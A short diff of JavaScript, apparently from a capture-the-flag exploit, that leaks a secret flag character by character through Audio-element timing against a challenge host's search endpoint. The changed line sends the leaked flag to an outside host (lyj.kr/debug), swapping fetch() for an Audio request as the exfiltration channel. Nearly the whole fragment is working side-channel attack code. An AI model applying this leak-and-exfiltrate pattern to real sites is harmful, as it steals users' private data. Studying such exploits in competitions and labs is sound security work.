@@ -19,7 +19,7 @@
     }
 x
     function send(char) {
-        fetch("https://lyj.kr/debug" + flag)
+        new Audio("https://lyj.kr/debug" + flag);
         const audio2 = new Audio(`http://prob.hspace.io:26019/search?query=${encodeURIComponent(flag + char)}`);
         audio2.addEventListener('canplaythrough', (e) => {
             if (audio2.duration == 30.1) {
